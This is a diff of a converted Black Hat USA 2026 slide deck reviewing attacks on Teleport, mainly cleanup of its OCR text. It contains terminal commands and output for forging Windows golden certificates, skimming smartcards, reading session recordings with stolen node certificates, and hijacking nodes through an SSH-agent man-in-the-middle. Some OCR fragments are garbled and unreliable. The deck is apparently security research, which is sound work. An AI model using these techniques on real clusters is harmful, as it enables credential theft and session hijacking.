@@ -8,19 +8,25 @@ year: 2026
 source_pdf: "BlackHat_USA_2026_Slides/Adam Chester_Beam Me Up, Luke A Review of Teleport Attack Scenarios.pdf"
 pages: 90
 sha256: "3c995b4e09191cadbc261ccbc5d0f3ffc1d893909e081e9243ed23a96b7d120e"
-text_chars: 33998
-ocr_pages: 17
+text_chars: 31614
+ocr_pages: 11
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 87.9
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 2
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:05:20Z"
+converted_at: "2026-08-12T05:28:03Z"
 ---
 # Beam Me Up, Luke A Review of Teleport Attack Scenarios
 
 **Speakers:** Adam Chester  
 **Conference:** Black Hat USA 2026  
 **Source:** `BlackHat_USA_2026_Slides/Adam Chester_Beam Me Up, Luke A Review of Teleport Attack Scenarios.pdf` (90 pages)
+
 
 ## Slide 1
 
@@ -158,21 +164,6 @@ User
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Architecture
-Cluster a _— _—
-S cl
-Database Windows RDP Node
-a -6.
-Auth Server Proxy Server
-O&
-User black hat
-)
-2026
-```
-
 ## Slide 9
 
 # Endpoint
@@ -229,7 +220,8 @@ X
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Endpoint
@@ -242,12 +234,9 @@ Extract keys to Localuser@teLeport-user's password:
 known_hosts
 local system xpn-teLleport-server.yamL
 current-profile
-example.com.pem
 reguLar-user-no-agent.pub
 exampLle.com-cert.pub
 certs.pem
-reguLar-user-no-agent.crt
-reguLlar-user-no-agent.key
 reguLar-user-no-agent
 Works locally -config.json
 attacker@teleport-linclient:~$ tsh ls
@@ -256,7 +245,6 @@ teLeport-node € Tunnel
 teLeport-node-2 € Tunnel
 xpn-teLleport-server 127.0.0.1:3022
 attacker@teleport-lLinclient:~$ |
-black hat
 2026 x
 ```
 
@@ -312,7 +300,8 @@ X
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Endpoint
@@ -327,8 +316,6 @@ Oracle is a registered trademark of Oracle Corporation and/or its
 affiliates. Other names may be trademarks of their respective
 owners.
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-mysqu> ff
-black hat
 2026 x
 ```
 
@@ -377,18 +364,6 @@ User
 12
 
 Information Classification: General
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Architecture
-S cl
-Database Windows RDP Node
-Auth Server () Proxy Server
-&
-User black hat
-Bose
-```
 
 ## Slide 19
 
@@ -464,19 +439,6 @@ User
 16
 
 Information Classification: General
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Architecture
-S cl
-Database Windows RDP Node
-a6.
-Auth Server (2) Proxy Server
-&
-User black hat
-Bose
-```
 
 ## Slide 24
 
@@ -618,7 +580,8 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Auth Server
@@ -629,8 +592,6 @@ When tunnel-manager is used, we can use grpcui to explore the API
 -k /tmp/client.key \
 -p 'teleport-auth@,h2' \
 -x teleport-server:8443
-PO em sili esses | Mls Seite ih ee th? s
-bool Giclee lg etal es ee ee eee [re
 [+] Starting TCP server to connection proxy: [127.0.0.1:9090]
 [*] Local server listening on 127.0.0.1:9090
 grpcui
@@ -736,20 +697,6 @@ User
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Architecture
-S cl
-Database Windows RDP Node
-a -6.
-Auth Server Proxy Server
-&
-User black hat
-24
-2026
-```
-
 ## Slide 38
 
 # Services
@@ -799,20 +746,6 @@ User
 27
 
 Information Classification: General
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Database Service
-S cl
-Database Windows RDP Node
-a—e.
-Auth Server Proxy Server
-&
-User black hat
-27
-2026
-```
 
 ## Slide 41
 
@@ -936,19 +869,6 @@ User
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-Windows Service
-S cl
-Database Windows RDP Node
-a—~o._*
-Auth Server Proxy Server
-&
-User black hat
-2026 35
-```
-
 ## Slide 50
 
 # Windows Service
@@ -1009,12 +929,11 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 52/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-)
 Windows Golden Certificate
-~~)
 certificate-tool allows us to automate this:
 certificate-tool
 go run ./main.go windows \
@@ -1023,19 +942,8 @@ go run ./main.go windows \
 --user localuser \
 --target TELEPORT-WINCLIENT-2 \
 --output /tmp/lelu/
-/ NON 2s NS ca No SekL Ae Teal, Uf cases WNW, Ses N
-\ Nee N ced! MAUR CID, fie he Ne of oe NM Weds ch
-a JX. PLL] JL IL. fall Qe os
 \/ \V/ \/ \V/ \/
-Foe sce: cad
-\ cdl ade eA
-I WiC -Serh see-D» he,
-Vcd! “Neceed se Ne fle
-@_xpn_
 [*] Certificates generated:
-/tmp/lelu/TELEPORT-WINCLIENT-2.csr
-/tmp/Lelu/TELEPORT-WINCLIENT-2.key
-black hat
 USA 40
 2026
 ```
@@ -1062,12 +970,11 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Windows Golden Certificate Demo
-© OO & pargevtietwaironrdp-cilent—u localuser -p ~ 10.41.1012 @ @ @ ironrvp
-a ee eee fees eanat 7 et (Nm toot i +
 RDPDR POU to send: RdpdrPdu(DeviceControlResponse { device_io_reply: DeviceloResponse { device
 -id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(LongReturn { re
 turn_code: Success })) })
@@ -1111,7 +1018,6 @@ _id: 1, completion_id: 2, io_status: STATUS_SUCCESS }, output_buffer: Some(Pdu(G
 Return { return_code: Success, reader_states: [ReaderStateCommonCall { current_state: CardStat
 eFlags(8x0), event_state: CardStateFlags(SCARD_STATE_CHANGED | SCARD_STATE_PRESENT), atr_lengt
 h: 11, atr: (59, 149, 19, 129, 1, 128, 115, 255, 1, 6, 11, 0, 0, 8, 0, 0, 6, GB, O, 6, B, A, 0,
-black hat
 @ys4 42
 ```
 
@@ -1215,24 +1121,22 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Windows Authentication
-@ New Order-the compute | @ Xbox-Scene.com - Xbox Bowlers Exhibition Centre  @_ New Tab Welcome to VX Heavens! = @ New Tab @ 290A Lads 1@ Resources +
+@ New Order-the compute | @ Xbox-Scene.com - Xbox Bowlers Exhibition Centre @_ New Tab Welcome to VX Heavens! = @ New Tab @ 290A Lads 1@ Resources +
 =
--teleport-server:8443/web/cluster/example.com/desktops/teleport-winclient/Administrator Ooole@aA
 Administrator on teleport-winclient G8 Ae
 :\temp>whoami
 winclient1\administrator
 :\temp>SmartcardSkimmer .exe
 83 109 97 114 116 99 97 114 100
 83 107 105 109 109 101 114
-)_Xpn_
 [*] Baseline PID: 1584
 [*] New user session found: 4112
 [*] New DLL Loaded, threadId: 772
-black hat
 oa 48
 Information Classification: 2026
 General
@@ -1375,7 +1279,8 @@ Node
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 b
@@ -1393,102 +1298,31 @@ Recording: https://youtu.be/Ca3D8HLS2qg
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 90/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-EMD © wip? 8 v1.26.4 ©
-) go run log-viewer/main.go list --cert /tmp/node.crt --key /tmp/node.key --proxy xpn-teleport-server:
-Te Ath imtoo tome UT LNN deoeb
-ieasiinel Uikeg AH i Seer
-@_xpn_
-|
-Lis
-[b9c5c4ca-3ae0-43a0-8d4a-9eac4482F188] :
-[c10decb0-0ffa-47a9-8a38-3903a03516F3] :
-[4Fe5#304-e67b-42cb-a2dd-9a7d2e987812] :
-[2£8596b0-d287-4b66-b189-2a565c630a3c]:
-[c686e643-a18b-49F9-8176-86bb02a36297] :
-[92019612-2141-4eb6-88fc-d180562214d2] :
-[d42138d2-54bf-4fed-9F7b-8e5d46a65941] :
-[dce55bc61-3ef0-4e54-8fe4-4afb97cdf027] :
-UWE © Wip 2? 81.26.46 ©
-) |
-T5239.
-Localuser@teLeport-node
-Localuser@teLeport-node
-Localuser@teLleport-node
-LocaLuser@teLleport-node
-LocaLluser@teleport-node
-‘LocaLluser@teleport-node
-LocaLuser@teLeport-node
-Localuser@teLleport-node
-15:39
-2026-06-29
-2026-06-29
-2026-06-30
-2026-06-30
-2026-06-30
-2026-07-01
-2026-07-02
-2026-07-02
-12);
-TS
-14:
-14:
-14:
-18:
-14:
-14:
-Sic)
-Bye
-03:
-06:
-Dives
-Sol
-28:
-30:
-97.
-43.
-20.
-43.
-10.
-54.
-52.
-7:
-867
-087
-967
-194
-364
-924
-$13
-442
-+0000
-+0000
-+0000
-+0000
-+0000
-+0000
-+0000
-+0000
-UTC
-UTC
-UTC
-UTC
-UTC
-UTC
-UTC
-UTC
-8443
-1 seconds
-2735 seconds
-16 seconds
-74 seconds
-17 seconds
-74665 seconds
-29 seconds
-14 seconds
-Recording: https://youtu.be/Ca3D8HLS2qqg
+[Terminal screenshot]
+
+     …/TAK    wip ?    v1.26.4    15:39
+❯ go run log-viewer/main.go list --cert /tmp/node.crt --key /tmp/node.key --proxy xpn-teleport-server:8443
+
+[ASCII-art banner reading: LOG-VIEWER]
+              @_xpn_
+
+[b9c5c4ca-3ae0-43a0-8d4a-9eac4482f188]: localuser@teleport-node - 2026-06-29 12:30:57.867 +0000 UTC - 1 seconds
+[c10decb0-0ffa-47a9-8a38-3903a03516f3]: localuser@teleport-node - 2026-06-29 15:57:43.087 +0000 UTC - 2735 seconds
+[4fe5f304-e67b-42cb-a2dd-9a7d2e987812]: localuser@teleport-node - 2026-06-30 14:03:20.967 +0000 UTC - 16 seconds
+[2f8596b0-d287-4b66-b189-2a565c630a3c]: localuser@teleport-node - 2026-06-30 14:06:43.194 +0000 UTC - 74 seconds
+[c686e643-a18b-49f9-8176-86bb02a36297]: localuser@teleport-node - 2026-06-30 14:07:10.364 +0000 UTC - 17 seconds
+[92019612-2141-4eb6-88fc-d180562214d2]: localuser@teleport-node - 2026-07-01 18:35:54.924 +0000 UTC - 74665 seconds
+[d42138d2-54bf-4fed-9f7b-8e5d46a65941]: localuser@teleport-node - 2026-07-02 14:28:52.313 +0000 UTC - 29 seconds
+[dc55bc61-3ef0-4e54-8fe4-4afb97cdf027]: localuser@teleport-node - 2026-07-02 14:30:17.442 +0000 UTC - 14 seconds
+
+     …/TAK    wip ?    v1.26.4    15:39
+❯
+
+Recording: https://youtu.be/Ca3D8HLS2qg
 ```
 
 ## Slide 76
@@ -1602,11 +1436,11 @@ Information Classification: General
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Node Hijacking —
->-SSH
 Node-Hijack allows us to carry out this attack
 tsh
 Localuser@teleport-user:~$ tsh ssh --user regular-user --proxy teleport-server:8443 teleport-
@@ -1618,8 +1452,6 @@ go run ./main.go hijack \
 -c /tmp/node.crt \
 -k /tmp/node.key \
 -n 58102c12-cf6a-4fd9-b74f-8a6c0e93765F
-WIS NE VIL hd
-@_xpn_
 [*] Press Enter to clean up...
 ] SSH Server Started on port 2223
 *] Renaming hostname: teleport-node-2 to teleport-node-2-archived
@@ -1647,11 +1479,10 @@ Recording: https://youtu.be/32QrQvVMPl8
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-lLocaluser@teleport-user: ~$ ]
-SEENON Wi Pw v1.26.4 15:37
 } go run ./main.go ssh -c /tmp/node.crt -k /tmp/node.key -n teleport-node-2 -o /tmp/hijack-certs/| |
 Recording: https://youtu.be/32QrQvVMPI8
 ```
@@ -1686,30 +1517,65 @@ Recording: https://youtu.be/RaDHaAkTdx8
 
 Information Classification: General
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 62/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-localuser@teleport-user:~$ tsh ssh -A teleport-node-2
-localuser@teleport-node-2:~$ 1s
-Ue © wip x!?) 8 v1.26.4 ©18:04 localuser@teleport-node-2:~$ 1s /tmpff
-) cd ../node-hijack
-vip x1? v1.26.4 Or8:04
-) go run ./main.go mitm -c /tmp/hijack-certs/host_tls_signed.crt -k /tmp/hijack-certs/host
-«key -n d1c11d95-883c-4062-a71a-7f0c709cc402
-1
-/tmp/hijack-certs/host_tls.pub
-Lae Neal fee Metal eNom, jee
-LAD Ves asneae Dhiba Berk RON Ne oe ISN
-@_xpn_
+[Slide title is cropped off the top edge of the page - only the tops of the letters are visible: illegible]
+
+[Left terminal window - title bar: localuser@teleport-node-2: ~]
+
+        /tmp/hijack-certs/host_tls.pub
+
+     …/TAK/certificate-tool    wip x!?    v1.26.4    18:04
+❯ cd ../node-hijack
+
+     …/TAK/node-hijack    wip x!?    v1.26.4    18:04
+❯ go run ./main.go mitm -c /tmp/hijack-certs/host_tls_signed.crt -k /tmp/hijack-certs/host
+.key -n d1c11d95-883c-4062-a71a-7f0c709cc402
+
+[ASCII-art banner reading: NODE-HIJACK]
+        @_xpn_
+
 [*] SSH Server Started on port 2223
-[x] Agent connected, listing keys
-[x] Key: ssh-ed25519-cert-vO1@openssh.com
-[x] Key: ssh-ed25519
-details: {}
-Localuser@teleport-node-2:~$ 1s
-localuser@teleport-node-2:~$ 1s /tmp) |
+
+[*] Agent connected, listing keys
+[*] Key: ssh-ed25519-cert-v01@openssh.com
+[*] Key: ssh-ed25519
+details:{}
+localuser@teleport-node-2:~$ ls
+localuser@teleport-node-2:~$ ls /tmp
+
+[dimmed / faded-out earlier terminal content below the divider line:]
+    -o 127.0.0.1:2223 \
+    -x teleport-server:8443 \
+    -u teleport-node-2.example.com
+
+[ASCII-art banner reading: REVERSE-TUNNEL]
+        @_xpn_
+
+[*] teleport-transport-dial request sent
+[*] New channel requested: teleport-discovery
+[*] Received request on teleport-discovery channel: discovery
+[*] Payload: {"proxies":[{"version":"v2","metadata":{"name":"[illegible - hidden behind the "Recording:" overlay]4ee572b"}}]}
+[*] Received request on teleport-discovery channel: discovery
+[*] Payload: {"proxies":[{"version":"v2","metadata":{"name":"23a49958-4448-4770-b62f-5f1ed4ee572b"}}]}
+[*] New channel requested: teleport-transport
+[!] Received request on teleport-transport channel: teleport-transport-dial
+[*] Payload: {"address":"@local-node","server_id":"teleport-node-2.example.com","conn_type":"node","client_src_addr":"10.1.10.22:36470","client_dst_addr":"127.0.0.1:8443"}
+
+[Right terminal window - title bar: localuser@teleport-node-2: ~]
+
+localuser@teleport-user:~$ tsh ssh -A teleport-node-2
+localuser@teleport-node-2:~$ ls
+localuser@teleport-node-2:~$ ls /tmp
+
 Recording: https://youtu.be/RaDHaAkTdx8
-Vor
+
+Information Classification:
+General
+
+black hat USA 2026
 67
 ```
 
